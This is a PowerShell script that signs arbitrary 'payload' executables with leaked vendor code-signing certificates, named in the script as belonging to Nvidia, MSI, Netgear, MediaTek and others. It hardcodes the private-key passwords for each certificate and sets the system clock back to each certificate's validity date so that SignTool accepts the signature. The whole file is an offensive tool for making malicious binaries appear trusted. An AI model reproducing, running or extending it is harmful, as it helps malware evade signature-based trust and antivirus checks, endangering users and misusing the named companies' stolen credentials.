function Sign-Payload {
    param(
        [string]
        $Infile = "",

        [string]
        $Outfile = "",

        [string]
        $Leaked
    )

    $Cert = ""
    $ExtraCert = ""
    $Password = ""
    $ChangeDate = ""
    $args = ""
    
    $TsUrl = "http://timestamp.digicert.com"

    $LeakedCerts = "$PSScriptRoot\certificates\$Leaked"
    $CurrDate = (Get-Date).ToString("yyyy-MM-dd")


    Write-Host $LeakedCerts
    
    if (-not [System.IO.File]::Exists($Infile)) {
        Write-Error "Input file does not exist: $Infile"
        exit 1
    }

    Copy-Item $Infile $Outfile -Force -EA SilentlyContinue

    if (-not [System.IO.File]::Exists($Outfile)) {
        Write-Error "Could not copy input file to output file: $Outfile"
        exit 1
    }
    
    if (-not [System.IO.Directory]::Exists($LeakedCerts)) {
        Write-Error "No such leaked certificates to use: $Leaked"
        Write-Host "`nReview available leaked certificates in $PSScriptRoot\certificates directory."
        exit 1
    }

    $Leaked = $Leaked.ToLower()

    if ($Leaked -eq "hangil2024") {
        $Cert      = "$LeakedCerts\certificate.pfx"
        $ExtraCert = "$LeakedCerts\SectigoPublicCodeSigningCAR36.crt"
        $Password  = "aa123123"
        $ChangeDate= "2024-11-09"
    }
    elseif ($Leaked -eq "izex2015") {
        $Cert      = "$LeakedCerts\IZexCert.pfx"
        $ExtraCert = "$LeakedCerts\MSCV-VSClass3.cer"
        $Password  = "izex1588"
        $ChangeDate= "2015-02-26"
    }
    elseif ($Leaked -eq "mediatek2017") {
        $Cert      = "$LeakedCerts\mediatek.pfx"
        $Password  = "www.mediatek.com"
        $ChangeDate= "2017-06-24"
    }
    elseif ($Leaked -eq "msi2021") {
        $Cert      = "$LeakedCerts\msi.pfx"
        $Password  = "1234"
        $ChangeDate= "2021-05-12"
    }
    elseif ($Leaked -eq "msi2024") {
        $Cert      = "$LeakedCerts\redred.pfx"
        $Password  = "2466"
        $ChangeDate= "2024-06-05"
    }
    elseif ($Leaked -eq "netgear2014") {
        $Cert      = "$LeakedCerts\netgear.pfx"
        $Password  = "N3tg3aR!"
        $ChangeDate= "2014-06-05"
    }
    elseif ($Leaked -eq "netgear2017") {
        $Cert      = "$LeakedCerts\netgear.pfx"
        $Password  = "N3tg3aR!"
        $ChangeDate= "2017-06-06"
    }
    elseif ($Leaked -eq "nvidia2014") {
        $Cert      = "$LeakedCerts\current_cert.pfx"
        $ExtraCert = "$LeakedCerts\1111222.cer"
        $Password  = "nv1d1aRules"
        $ChangeDate= "2014-01-01"
    }
    elseif ($Leaked -eq "nvidia2018") {
        $Cert      = "$LeakedCerts\current_cert.pfx"
        $ExtraCert = "$LeakedCerts\CSC3-2010.crt"
        $Password  = "nv1d1aRules"
        $ChangeDate= "2018-07-26"
    }
    elseif ($Leaked -eq "canada2023") {
        $Cert      = "$LeakedCerts\jaja.pfx"
        $Password  = "thia"
        $ChangeDate= "2023-08-31"
    }

    if ($Password.Length -gt 0 ) {
        $args += " /p ""$Password"""
    }

    if ($ExtraCert.Length -gt 0 ) {
        $args += " /ac ""$ExtraCert"""
    }

    if ($ChangeDate.Length -gt 0) {
        Change-Date -NewDate $ChangeDate
    }

    $cmd = "sign /debug /v /t ""$TsUrl"" /fd SHA256 /f ""$Cert"""
    $cmd += " $args"
    $cmd += " /a ""$Outfile"""

    Write-Host "Running: $cmd`n" -ForegroundColor Magenta
    Write-Host "--------------------------------------------------------------------"
    Write-Host
    Invoke-Expression "& `"$PSScriptRoot\SignTool.exe`" $cmd"
    Write-Host
    Write-Host "--------------------------------------------------------------------"

    if ($ChangeDate.Length -gt 0) {
        Change-Date -NewDate $CurrDate
    }
}

function Check-LocalAdmin {
    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Change-Date { 
<#
.SYNOPSIS
    Used by signer.exe to change system date before running SignTool.exe.

.PARAMETER NewDate
    New system date to set. Format: YYYY-MM-DD
#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True)]
        [String]
        $NewDate = ""
    )

    if(-not (Check-LocalAdmin)) {
        Write-Error "[!] Local Admin Required."
        exit 1
    }

    set-date -date ("$NewDate " + (Get-Date).ToString("hh:mm:ss tt"));
}
